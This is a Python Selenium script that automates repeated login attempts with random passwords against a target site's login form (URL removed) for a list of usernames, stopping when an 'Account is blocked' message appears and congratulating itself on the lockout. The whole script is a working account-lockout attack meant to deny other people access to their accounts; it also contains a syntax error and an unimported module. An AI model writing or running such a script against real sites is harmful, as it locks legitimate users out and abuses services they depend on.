from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
import random
import string

# Function to generate a random password
def generate_random_password(length=8):
    """Generates a random password with letters and digits."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Chrome Driver Path
chrome_driver_path = r"C:\Users\Abhishek\Desktop\chromedriver-win64\chromedriver.exe"  # Correct path to chromedriver.exe
service = Service(r"C:\Users\Abhishek\Desktop\chromedriver-win64\chromedriver.exe")  # Correct path to chromedriver.exe

# Setup Chrome options
options = Options()
options.add_argument("--headless")        # Run in headless mode (optional)
options.add_argument("--disable-gpu")     # Disable GPU (optional for compatibility)
options.add_argument("start-maximized")   # Start browser maximized
options.add_argument("disable-extensions")  # Disable extensions (optional)
options.add_argument("--disable-infobars")  # Disable info bars
options.add_argument("--no-sandbox")      # Ensure the browser doesn't use the sandbox mode (improves speed)
options.add_argument("--disable-software-rasterizer")

# Initialize the WebDriver
driver = webdriver.Chrome(service=service, options=options)

# Target website
website_url = #/login"
usernames = []  # Example username list

# Function to dismiss the popup if it appears
def dismiss_popup(driver, wait):
    try:
        # Check for a popup and click the 'OK' or close button
        ok_button = wait.until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div/div[6]/button[1]")))
        ok_button.click()  # Dismiss the popup
        print("Popup dismissed.")
    except Exception:
        print("")

# Function to perform login attempt
def login_attempt(username):
    login_attempts = 0
    max_attempts = 6
    blocked = False

    while login_attempts < max_attempts and not blocked:
        try:
            driver.get(website_url)

            # Wait for the login elements to be loaded
            wait = WebDriverWait(driver, 2)

            # Close any popups first
            dismiss_popup(driver, wait)

            # Find the username and password fields
            username_field = driver.find_element(By.NAME, "username")
            password_field = driver.find_element(By.NAME, "password")
            login_button = driver.find_element(By.XPATH, '//*[@id="btn-login"]')

            # Generate a random password
            random_password = generate_random_password()

            # Fill in the username and password fields
            username_field.clear()
            username_field.send_keys(username)
            password_field.clear()
            password_field.send_keys(random_password)

            # Force-click the login button using JavaScript
            driver.execute_script("arguments[0].click();", login_button)

            # Check if the account is blocked (this can be adjusted based on your UI)
            try:
                error_message = driver.find_element(By.XPATH, "//*[contains(text(), 'Account is blocked')]")
                print(f"Account {username} is blocked after {login_attempts + 1} attempts.")
                blocked = True
            except:
                print(f"Login attempt {login_attempts + 1} for {username} triggered.")

            login_attempts += 1

        except Exception as e:
            print(f"An error occurred during login for {username}: {e}")
            login_attempts += 1

    if not blocked:
        print(f"Login attempts for {username} exceeded {max_attempts}. Congrts The ID has been blocked.")

# Attempt login for each username
for user in usernames:
    print(f"Starting login attempts for username: {user}")
    login_attempt(user)

# Close the browser after completion
driver.quit() 
